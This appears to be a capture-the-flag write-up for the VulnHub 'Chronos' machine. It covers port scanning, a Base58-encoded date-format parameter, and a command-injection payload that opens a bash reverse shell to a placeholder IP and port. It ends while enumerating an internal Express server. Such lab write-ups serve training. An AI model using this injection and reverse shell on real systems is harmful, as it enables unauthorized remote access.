# Chronos

![image](https://user-images.githubusercontent.com/5285547/129067750-516ca744-9b4c-4347-982f-5d4a36e431e9.png)

Room link: https://www.vulnhub.com/entry/chronos-1,735/

## Enum

Nmap 

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
```


# Port 80

Nothing much on the home page, refreshing and checking in the dev networks tools shows a strage url request

![image](https://user-images.githubusercontent.com/5285547/129068515-2591006b-ed4a-411c-99f3-540e35be3aef.png)


```
http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
```

Add chronos.local to /etc/hosts file

Now on the page we see the result. 

![image](https://user-images.githubusercontent.com/5285547/129071126-5810cb0f-273c-473e-a8de-a117fc8b32d9.png)

Checking the encoding, it turns out its Base58

![image](https://user-images.githubusercontent.com/5285547/129075155-f2d4cab2-28b4-4fa5-94e0-bb741ec74391.png)

![image](https://user-images.githubusercontent.com/5285547/129083902-4b104c8a-ba76-4b90-9a19-8ddf1f623217.png)

Next was to get a reverse shell. 

```
# payload
;bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1";
```

![image](https://user-images.githubusercontent.com/5285547/129084566-7f38c45b-3083-47b7-b3c5-667bcac3b5e2.png)

Finding another webservice on 127.0.0.1:8080, I checked the system for the files. 

```
www-data@chronos:/opt/chronos-v2/backend$ pwd
/opt/chronos-v2/backend
```
```
www-data@chronos:/opt/chronos-v2/backend$ cat server.js 
const express = require('express');
const fileupload = require("express-fileupload");
const http = require('http')

const app = express();

app.use(fileupload({ parseNested: true }));

app.set('view engine', 'ejs');
app.set('views', "/opt/chronos-v2/frontend/pages");

app.get('/', (req, res) => {
   res.render('index')
});

const server = http.Server(app);
const addr = "127.0.0.1"
const port = 8080;
server.listen(port, addr, () => {
   console.log('Server listening on ' + addr + ' port ' + port);
});
```


